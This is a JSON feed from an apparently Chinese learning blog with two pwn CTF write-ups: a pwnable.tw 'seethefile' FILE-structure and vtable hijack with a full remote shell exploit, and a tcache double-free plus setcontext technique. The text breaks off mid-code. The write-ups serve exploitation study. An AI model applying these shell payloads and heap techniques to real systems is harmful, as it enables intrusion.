{
    "version": "https://jsonfeed.org/version/1",
    "title": "唐仔橙",
    "description": "喜欢探索世界,在读研究生,计算机爱好者的成长记录",
    "home_page_url": "https://tangzichengcc.github.io",
    "items": [
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-49-pwnable%E4%B9%8Bseethefile/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-49-pwnable%E4%B9%8Bseethefile/",
            "title": "pwn入门-49-pwnable之seethefile",
            "date_published": "2024-01-28T14:31:00.000Z",
            "content_html": "<p>主要参考: <a href=\"https://xuanxuanblingbling.github.io/ctf/pwn/2020/04/03/file/\">https://xuanxuanblingbling.github.io/ctf/pwn/2020/04/03/file/</a></p>\n<p>2.23版本没有做检查, 简单入门下iofile</p>\n<h1 id=\"利用分析\"><a href=\"#利用分析\" class=\"headerlink\" title=\"利用分析\"></a>利用分析</h1><p>Ubuntu GLIBC 2.23-0ubuntu5</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> nptr; <span class=\"comment\">// [esp+Ch] [ebp-2Ch]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v4; <span class=\"comment\">// [esp+2Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v4 = __readgsdword(<span class=\"number\">0x14</span>u);</span><br><span class=\"line\">  init();</span><br><span class=\"line\">  welcome();</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    menu();</span><br><span class=\"line\">    __isoc99_scanf(<span class=\"string\">&quot;%s&quot;</span>, &amp;nptr);</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> ( atoi(&amp;nptr) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">        openfile();</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">        readfile();</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">3</span>:</span><br><span class=\"line\">        writefile();</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">4</span>:</span><br><span class=\"line\">        closefile();</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"number\">5</span>:</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Leave your name :&quot;</span>);</span><br><span class=\"line\">        __isoc99_scanf(<span class=\"string\">&quot;%s&quot;</span>, &amp;name);</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Thank you %s ,see you next time\\n&quot;</span>, &amp;name);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( fp )</span><br><span class=\"line\">          fclose(fp);</span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">      <span class=\"keyword\">default</span>:</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Invaild choice&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t一眼顶针  name存在溢出，可以溢出到fp, 并且保护没有开PIE,可以知道地址,</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.bss:<span class=\"number\">0804B</span>260 name            db <span class=\"number\">20</span>h <span class=\"title function_\">dup</span><span class=\"params\">(?)</span>           ; DATA XREF: main+<span class=\"number\">9F</span>↑o</span><br><span class=\"line\">.bss:<span class=\"number\">0804B</span>260                                         ; main+B4↑o</span><br><span class=\"line\">.bss:<span class=\"number\">0804B</span>280                 public fp</span><br><span class=\"line\">.bss:<span class=\"number\">0804B</span>280 ; FILE *fp</span><br><span class=\"line\">.bss:<span class=\"number\">0804B</span>280 fp              dd ?                    ; DATA XREF: openfile+<span class=\"number\">6</span>↑r</span><br><span class=\"line\">.bss:<span class=\"number\">0804B</span>280                                         ; openfile+AD↑w ...</span><br><span class=\"line\">.bss:<span class=\"number\">0804B</span>280 _bss            ends</span><br><span class=\"line\">.bss:<span class=\"number\">0804B</span>280</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\tfp这里是一个FILE结构体，如何利用呢？</p>\n<p>​\t伪造一个fake FILE，放到bss后面就可以了，地址也知道，然后覆盖地址为伪造的FILE地址</p>\n<h1 id=\"伪造iofile及其虚表\"><a href=\"#伪造iofile及其虚表\" class=\"headerlink\" title=\"伪造iofile及其虚表\"></a>伪造iofile及其虚表</h1><p>​\t如何伪造？ 各个变量的值应该是多少？、</p>\n<p>​\tfile结构：<a href=\"https://ctf-wiki.org/pwn/linux/user-mode/io-file/introduction/\">https://ctf-wiki.org/pwn/linux/user-mode/io-file/introduction/</a></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fakeFILE = <span class=\"number\">0x0804B284</span></span><br><span class=\"line\">payload  = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x20</span></span><br><span class=\"line\">payload += p32(fakeFILE)</span><br><span class=\"line\">payload += p32(<span class=\"number\">0xffffdfff</span>)</span><br><span class=\"line\">payload += <span class=\"string\">&quot;;$0&quot;</span>+<span class=\"string\">&#x27;\\x00&#x27;</span>*<span class=\"number\">0x8d</span> </span><br><span class=\"line\">payload += p32(fakeFILE+<span class=\"number\">0x98</span>)  <span class=\"comment\">// 这是虚表地址</span></span><br><span class=\"line\">payload += p32(system_addr)*<span class=\"number\">3</span>  <span class=\"comment\">// 虚表内容</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\tiofile的结构如下图: </p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-49-pwnable%E4%B9%8Bseethefile/image-20230807102222274.png\" alt=\"img\"></p>\n<h2 id=\"伪造flags-从而触发-finish\"><a href=\"#伪造flags-从而触发-finish\" class=\"headerlink\" title=\"伪造flags 从而触发_finish\"></a>伪造flags 从而触发_finish</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">_flags&amp;0x2000为0就会直接调用_IO_FINSH(fp),_IO_FINSH(fp)相当于调用fp-&gt;vtable-&gt;_finish(fp)</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t所以最后是调用了_IO_file_finish触发的（fclose？）， 为什么不用&#x2F;bin&#x2F;sh呢？</p>\n<h2 id=\"伪造虚表\"><a href=\"#伪造虚表\" class=\"headerlink\" title=\"伪造虚表\"></a>伪造虚表</h2><p>​\tIOFILE之后就是 _IO_file_jumps，所以，可以劫持这个vtable指针，</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; p <span class=\"title function_\">sizeof</span><span class=\"params\">(_IO_FILE)</span></span><br><span class=\"line\">$4 = <span class=\"number\">148</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t大小是148， 也就是0x94, 0x94这里存的是虚表的地址,所以 虚表的位置位于fakeFILE+0x94 + 4</p>\n<p>​\t_finish位于第三个位置,所以把第三个位置伪造成system就行了</p>\n<h2 id=\"0是什么？\"><a href=\"#0是什么？\" class=\"headerlink\" title=\";$0是什么？\"></a>;$0是什么？</h2><p>;是隔断命令的意思, $0经过实验是bash</p>\n<h1 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h1><p>exp一直没成功，估计是栈平衡的事？ 不像, libc的事</p>\n<p>本地和远程还不太一样, 远程的话,接收到的libc地址需要+0x1000( 在调试的时候能发现这一个特殊的地方,虽然不知道是干啥的,</p>\n<p>远程打通的exp</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">context</span><span class=\"params\">(arch=<span class=\"string\">&#x27;i386&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">myelf  = ELF(<span class=\"string\">&quot;./seethefile&quot;</span>)</span><br><span class=\"line\"><span class=\"meta\">#libc   = ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>)</span></span><br><span class=\"line\">libc   = ELF(<span class=\"string\">&quot;./libc_32.so.6&quot;</span>)</span><br><span class=\"line\">io     = remote(<span class=\"string\">&quot;chall.pwnable.tw&quot;</span>,<span class=\"number\">10200</span>)</span><br><span class=\"line\"><span class=\"meta\">#io = process(<span class=\"string\">&quot;./seethefile&quot;</span>)</span></span><br><span class=\"line\">sla          = lambda delim,data       :io.sendlineafter(delim, data)</span><br><span class=\"line\">openfile     = lambda name :  (sla(<span class=\"string\">&quot;choice :&quot;</span>,<span class=\"string\">&quot;1&quot;</span>),sla(<span class=\"string\">&quot;see :&quot;</span>,name))</span><br><span class=\"line\">readfile     = lambda      :  (sla(<span class=\"string\">&quot;choice :&quot;</span>,<span class=\"string\">&quot;2&quot;</span>))</span><br><span class=\"line\">showfile     = lambda      :  (sla(<span class=\"string\">&quot;choice :&quot;</span>,<span class=\"string\">&quot;3&quot;</span>))</span><br><span class=\"line\">leave        = lambda name :  (sla(<span class=\"string\">&quot;choice :&quot;</span>,<span class=\"string\">&quot;5&quot;</span>),sla(<span class=\"string\">&quot;ame :&quot;</span>,name))</span><br><span class=\"line\"><span class=\"meta\"># gdb.attach(io)</span></span><br><span class=\"line\"><span class=\"meta\"># leak libc</span></span><br><span class=\"line\">openfile(<span class=\"string\">&quot;/proc/self/maps&quot;</span>)</span><br><span class=\"line\">readfile()</span><br><span class=\"line\">showfile()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;[heap]\\n&quot;</span>)</span><br><span class=\"line\">libc_addr = <span class=\"type\">int</span>(io.recv(<span class=\"number\">8</span>),<span class=\"number\">16</span>) + <span class=\"number\">0x1000</span></span><br><span class=\"line\">print(<span class=\"string\">&quot;libc:&quot;</span>,hex(libc_addr))</span><br><span class=\"line\">system_addr = libc_addr +libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">print(hex(system_addr))</span><br><span class=\"line\"><span class=\"meta\">#pause()</span></span><br><span class=\"line\"><span class=\"meta\"># make fake file</span></span><br><span class=\"line\">fakeFILE = <span class=\"number\">0x0804B284</span></span><br><span class=\"line\">payload  = b<span class=\"number\">&#x27;</span>a<span class=\"number\">&#x27;</span>*<span class=\"number\">0x20</span></span><br><span class=\"line\">payload += p32(fakeFILE)</span><br><span class=\"line\">payload += p32(<span class=\"number\">0xffffdfff</span>)</span><br><span class=\"line\">payload += b<span class=\"string\">&quot;;$0&quot;</span>+b<span class=\"number\">&#x27;</span>\\x00<span class=\"number\">&#x27;</span>*<span class=\"number\">0x8d</span></span><br><span class=\"line\">payload += p32(fakeFILE+<span class=\"number\">0x98</span>)</span><br><span class=\"line\">payload += p32(system_addr)*<span class=\"number\">3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\"># getshell</span></span><br><span class=\"line\">leave(payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n",
            "tags": []
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-48-setcontext%E5%BA%94%E7%94%A8/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-48-setcontext%E5%BA%94%E7%94%A8/",
            "title": "pwn入门-48-setcontext应用",
            "date_published": "2024-01-27T15:28:41.000Z",
            "content_html": "<p><a href=\"https://www.anquanke.com/post/id/236832\">https://www.anquanke.com/post/id/236832</a></p>\n<h3 id=\"什么是setcontext-可以用在什么场景下\"><a href=\"#什么是setcontext-可以用在什么场景下\" class=\"headerlink\" title=\"什么是setcontext,可以用在什么场景下\"></a>什么是setcontext,可以用在什么场景下</h3><p>翻看了一遍，暂时没有找到漏洞点呀。。。</p>\n<p>嗯，这就是你知识点的盲区了</p>\n<p>这里是tcache的洞</p>\n<p>libc版本多少？ 这个版本貌似还没有 key加密</p>\n<p>2.31版本,</p>\n<h1 id=\"代码分析\"><a href=\"#代码分析\" class=\"headerlink\" title=\"代码分析\"></a>代码分析</h1><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">sub_1641</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;1.Give birth to a child&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;2.Change child&#x27;s name&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;3.Show children&#x27;s name&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;4.Remove your child&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;5.Edit child&#x27;s description.&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;6.Exit&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;&gt;&gt; &quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>base+4060这个地址存储的是标志位,表示是否被使用了 （ 记为 chunk_list_flag)</p>\n<p>base+40a0存储的是chunk的地址（ 记为 chunk_list)</p>\n<h2 id=\"chunk结构分析如下\"><a href=\"#chunk结构分析如下\" class=\"headerlink\" title=\"chunk结构分析如下\"></a>chunk结构分析如下</h2><p><img src=\"/pwn%E5%85%A5%E9%97%A8-48-setcontext%E5%BA%94%E7%94%A8/image-20240123152741503.png\" alt=\"image-20240123152741503\"></p>\n<p>0x0 → pre_size </p>\n<p>0x8 → size</p>\n<p> 0x10 → name </p>\n<p>0x18 → gender </p>\n<p>0x20 → des </p>\n<h2 id=\"1-add\"><a href=\"#1-add\" class=\"headerlink\" title=\"1. add\"></a>1. add</h2><p>添加的话可以重复添加到一个序号，覆盖之前的，比如一直选择1号，第二次添加会覆盖第一次的</p>\n<h2 id=\"2-changename\"><a href=\"#2-changename\" class=\"headerlink\" title=\"2. changename\"></a>2. changename</h2><p>逻辑就是判断chunk_list_flag是否为1，为1的话，说明存在这个chunk，然后就去修改</p>\n<h2 id=\"3-show\"><a href=\"#3-show\" class=\"headerlink\" title=\"3. show\"></a>3. show</h2><p>​\t要检查chunk_list_flag、</p>\n<h2 id=\"4-delete\"><a href=\"#4-delete\" class=\"headerlink\" title=\"4. delete\"></a>4. delete</h2><p>这里也是有漏洞的。。。当时没发现</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">sub_196B</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __int64 v0; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v2; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Please input index?&quot;</span>);</span><br><span class=\"line\">  LODWORD(v0) = sub_15E9();</span><br><span class=\"line\">  v2 = v0;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"type\">int</span>)v0 &gt;= <span class=\"number\">0</span> &amp;&amp; (<span class=\"type\">int</span>)v0 &lt;= <span class=\"number\">9</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v0 = qword_40A0[(<span class=\"type\">int</span>)v0];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v0 )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">free</span>((<span class=\"type\">void</span> *)qword_40A0[v2]);</span><br><span class=\"line\">      dword_4060[v2] = <span class=\"number\">0</span>;</span><br><span class=\"line\">      LODWORD(v0) = <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Done&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t首先dword_4060并没有检查，那你把它置为0又有什么用呢？ 反正没有检查，然后虽然把40a0处的地址释放了，但是没有清0呀，导致还可以继续释放</p>\n<h2 id=\"5-changecontent\"><a href=\"#5-changecontent\" class=\"headerlink\" title=\"5. changecontent\"></a>5. changecontent</h2><p>也是先判断chunk_list_flag是否为1</p>\n<h2 id=\"666-改性别\"><a href=\"#666-改性别\" class=\"headerlink\" title=\"666. 改性别\"></a>666. 改性别</h2><p>只能改一次，<font color=\"red\">这里并没有检查chunk_list_flag，所以一定要细心，当时没仔细看这里</font>,并且会直接打印当前的性别，所以可以利用这个进行信息泄露，因为这里是bk的位置</p>\n<p>如果目标堆块处于 <code>tcache</code>中，那么修改性别就能泄露 <code>堆地址</code></p>\n<p>如果目标堆块处于 <code>unsort bin</code>中，那么修改性别就有可能泄露 <code>libc地址</code></p>\n<h1 id=\"利用步骤\"><a href=\"#利用步骤\" class=\"headerlink\" title=\"利用步骤\"></a>利用步骤</h1><h2 id=\"1-泄露地址\"><a href=\"#1-泄露地址\" class=\"headerlink\" title=\"1.泄露地址\"></a>1.泄露地址</h2><p>​\t\tdouble free利用的是tcache的double free，free进到tcache是不做检查的，所以才要先add一下，让tcache有一个空位</p>\n<p>​\t\t当第二次free(8)的时候，8已经被free两次了其实，一次在usbin中，一次在tcache中</p>\n<p>​\t\t这里<font color=\"red\">继续add(0,1,’1’)</font> 占据的是0号的chunk_list,这里申请到的是tcache中的8，bb20。 如此一来，chunk_list的0号和8号都是一个chunk了,<font color=\"red\"> 这样一个free后,另一个就可以show来泄露信息</font></p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-48-setcontext%E5%BA%94%E7%94%A8/image-20240123154856126.png\" alt=\"image-20240123154856126\"></p>\n<p>​\t\t然后继续free(8), 虽然8不能show，但这时候0是可以show的，所以show 0就得到了泄露的堆地址\t\t</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># ----------------------------- <span class=\"number\">1</span> 利用<span class=\"type\">double</span> <span class=\"built_in\">free</span>构造堆块重叠， 泄露heap和libc地址</span><br><span class=\"line\"><span class=\"keyword\">for</span> i in <span class=\"title function_\">range</span><span class=\"params\">(<span class=\"number\">10</span>)</span>:</span><br><span class=\"line\">    <span class=\"title function_\">add</span><span class=\"params\">(i,<span class=\"number\">1</span>,<span class=\"string\">&#x27;a&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i in <span class=\"title function_\">range</span><span class=\"params\">(<span class=\"number\">7</span>)</span>:    # 填充满tcache </span><br><span class=\"line\">    <span class=\"title function_\">free</span><span class=\"params\">(<span class=\"number\">6</span>-i)</span></span><br><span class=\"line\"># 合并进入usbin， 先8后7，反过来呢？ 没影响 这俩合并在一起。 目的其实是后面可以单独操纵其中一块</span><br><span class=\"line\"><span class=\"title function_\">free</span><span class=\"params\">(<span class=\"number\">7</span>)</span></span><br><span class=\"line\"><span class=\"title function_\">free</span><span class=\"params\">(<span class=\"number\">8</span>)</span></span><br><span class=\"line\"># 从tcache中取出第一块分配， tcache后进先出， 所以分配的是0号</span><br><span class=\"line\"><span class=\"title function_\">add</span><span class=\"params\">(<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"string\">&#x27;1&#x27;</span>)</span></span><br><span class=\"line\"># 这里用到了<span class=\"type\">double</span> <span class=\"built_in\">free</span>，将合并状态下的一部分chunk放入tcache，造成堆块重叠（谁和谁重叠呢？ tcache的第一个和usbin的？</span><br><span class=\"line\"><span class=\"title function_\">free</span><span class=\"params\">(<span class=\"number\">8</span>)</span> # 为啥这里能再次<span class=\"built_in\">free</span>呢？ <span class=\"built_in\">free</span>进tcahe，所以前面用到了一个add。。</span><br><span class=\"line\"><span class=\"title function_\">add</span><span class=\"params\">(<span class=\"number\">0</span>,<span class=\"number\">1</span>,<span class=\"string\">&#x27;1&#x27;</span>)</span># 再次申请，使放入tcache中的usbin chunk被分配（8号），泄露堆地址（为什么还是可以0呢？编号是可以覆盖的，但是实际上还是要创建新的内存</span><br><span class=\"line\"><span class=\"title function_\">free</span><span class=\"params\">(<span class=\"number\">8</span>)</span>   # 继续<span class=\"type\">double</span> <span class=\"built_in\">free</span> 这里会填入地址啦，就是从这里泄露的</span><br><span class=\"line\"><span class=\"title function_\">show</span><span class=\"params\">(<span class=\"number\">0</span>)</span>  # 为什么不能show 8呢 要检测chunk_list_flag</span><br><span class=\"line\"><span class=\"title function_\">ru</span><span class=\"params\">(<span class=\"string\">&#x27;nder: &#x27;</span>)</span></span><br><span class=\"line\">heap_addr = uu64(r(<span class=\"number\">6</span>))</span><br><span class=\"line\">leak(heap_addr)</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t把tcache都申请了，然后把unsortedbin再申请一半，剩下的一半的fd和bk就是main_arena的地址了</p>\n<p>​\t\t记住这里申请的1的话也是bb20，就是那个uaf的堆块，这样的话，0 1都是它了，然后show 0 (1也行)就能show出来usbin的bk，也就能泄露堆地址了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> i in <span class=\"title function_\">range</span><span class=\"params\">(<span class=\"number\">1</span>,<span class=\"number\">9</span>)</span>:</span><br><span class=\"line\">    <span class=\"title function_\">add</span><span class=\"params\">(i,<span class=\"number\">1</span>,str(i)+str(i))</span></span><br><span class=\"line\"><span class=\"title function_\">show</span><span class=\"params\">(<span class=\"number\">0</span>)</span></span><br><span class=\"line\"><span class=\"title function_\">ru</span><span class=\"params\">(<span class=\"string\">&#x27;nder: &#x27;</span>)</span></span><br><span class=\"line\">base = uu64(r(<span class=\"number\">6</span>))<span class=\"number\">-0x1ebbe0</span></span><br><span class=\"line\">leak(base)</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"2-在堆块上布置-触发-setcontext链的-gadget\"><a href=\"#2-在堆块上布置-触发-setcontext链的-gadget\" class=\"headerlink\" title=\"2. 在堆块上布置 触发 setcontext链的 gadget\"></a>2. 在堆块上布置 触发 setcontext链的 gadget</h2><h3 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h3><p>​\t因为是第一次使用这个手法,看原文wp很蒙, 但结合后面的步骤就理解了.</p>\n<p>​\t其实这里就是要布置一下触发free_hook之后的行为,让它把控制流转到setcontext(因为没办法直接转到setcontext或者说直接转过去的话会缺少一些条件), 我们是把free_hook修改为了这个gadget</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># </span><br><span class=\"line\"><span class=\"string\">&quot;&quot;</span><span class=\"string\">&quot;</span></span><br><span class=\"line\"><span class=\"string\">gadget </span></span><br><span class=\"line\"><span class=\"string\">    mov     rdx, [rdi+8]</span></span><br><span class=\"line\"><span class=\"string\">    mov     [rsp+0C8h+var_C8], rax</span></span><br><span class=\"line\"><span class=\"string\">    call    qword ptr [rdx+20h]</span></span><br><span class=\"line\"><span class=\"string\">&quot;</span><span class=\"string\">&quot;&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t于是乎,在free触发的时候，传入的第一个参数rdi是 要free的chunk的地址 </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov rdx, qword ptr [rdi + <span class=\"number\">8</span>]</span><br><span class=\"line\">call qword ptr [rdx + <span 